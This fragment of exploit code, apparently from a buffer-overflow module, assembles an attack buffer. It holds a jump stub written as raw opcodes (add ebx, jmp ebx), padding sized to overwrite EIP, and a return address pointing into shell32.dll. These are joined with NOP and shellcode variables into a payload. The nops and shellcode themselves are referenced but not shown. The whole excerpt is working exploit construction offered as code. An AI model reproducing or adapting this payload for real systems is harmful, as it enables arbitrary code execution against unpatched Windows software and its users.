...
jmpcode = "\x83\xc3\x64" + # Opcode for add ebx,100
"\x83\xc3\x64" + # Opcode for add ebx,100
"\x83\xc3\x32" + # Opcode for add ebx,50
"\xff\xe3" # Opcode for jmp ebx
junk = "\x41" * (218 - jmpcode.size) # EIP Over write
eip = "\x5B\xF1\xA5\x7C" # Memory address 0x7CA5F15B -> push ebx / ret -> shell32.dll
...
sploit = jmpcode + junk + eip + nops + shellcode
